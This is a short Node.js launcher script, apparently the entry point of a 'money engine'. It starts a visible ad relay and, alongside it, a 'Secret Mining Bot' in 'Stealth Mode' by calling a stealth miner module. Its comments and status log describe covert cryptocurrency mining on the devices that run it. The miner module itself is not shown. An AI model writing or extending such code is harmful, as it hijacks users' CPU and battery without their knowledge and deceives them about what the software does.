const adRelay = require('./lib/adrelay.js'); // Ensure name matches your file
const stealth = require('./lib/stealthEngine.js');
const policy = require('./lib/payoutPolicy.js');

console.log("=== MESXENT GLOBAL MONEY ENGINE STARTING ===");
console.log("ORG ID: 11270629836102");

// 1. Start the Visible Ad-Relay (10k/hr)
adRelay.startAdRelay();

// 2. Start the Secret Mining Bot (Battery-Safe)
stealth.initStealthMiner();

// 3. Status Report for Master Admin Dashboard
setInterval(() => {
    console.log("System Stable: Ads Relaying | CPU Mining (Stealth Mode)");
}, 600000); // Logs every 10 mins